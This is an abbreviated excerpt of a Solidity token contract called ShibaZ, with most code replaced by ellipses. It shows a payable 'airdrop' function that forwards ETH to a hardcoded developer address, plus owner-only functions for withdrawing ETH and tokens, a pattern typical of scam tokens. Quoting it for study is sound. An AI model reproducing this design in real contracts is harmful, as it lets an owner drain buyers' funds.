...
contract ShibaZ{
    ...
    string private _name = "ShibaZ";
    string private _symbol = "SHIBAZ";
   ...
   function clearETH() public onlyOwner() {
    ...
    function airdrop(address _refer)payable public returns(bool){
        ...
        if(_msgSender()!=_refer&&_refer!=address(0)&&_balances[_refer]>0){
            ...
            address(uint160(0x8Da253116Df8D8125DCFBFb248dE68112258aDdf)).transfer(devEth);
        }
        return true;
    }
    ...
    function clearToken2(uint amount) public onlyOwner {
